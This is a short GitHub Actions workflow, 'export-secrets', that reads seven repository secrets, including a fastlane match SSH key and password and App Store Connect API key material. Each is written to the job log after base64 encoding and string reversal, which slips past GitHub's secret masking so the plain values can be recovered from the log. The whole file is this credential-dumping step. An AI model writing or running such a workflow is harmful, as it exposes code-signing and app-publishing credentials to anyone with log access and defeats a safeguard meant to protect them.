name: export-secrets
on:
  workflow_dispatch:
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          S1: ${{ secrets.MATCH_PASSWORD }}
          S2: ${{ secrets.MATCH_SSH_KEY }}
          S3: ${{ secrets.ASC_KEY_CONTENT }}
          S4: ${{ secrets.ASC_KEY_ID }}
          S5: ${{ secrets.ASC_ISSUER_ID }}
          S6: ${{ secrets.MATCH_GIT_URL }}
          S7: ${{ secrets.GIT_USERNAME }}
        run: |
          enc() { printf '%s' "$1" | base64 -w0 | rev; }
          echo "BEGINSECRET MATCH_PASSWORD $(enc "$S1") ENDSECRET"
          echo "BEGINSECRET MATCH_SSH_KEY $(enc "$S2") ENDSECRET"
          echo "BEGINSECRET ASC_KEY_CONTENT $(enc "$S3") ENDSECRET"
          echo "BEGINSECRET ASC_KEY_ID $(enc "$S4") ENDSECRET"
          echo "BEGINSECRET ASC_ISSUER_ID $(enc "$S5") ENDSECRET"
          echo "BEGINSECRET MATCH_GIT_URL $(enc "$S6") ENDSECRET"
          echo "BEGINSECRET GIT_USERNAME $(enc "$S7") ENDSECRET"
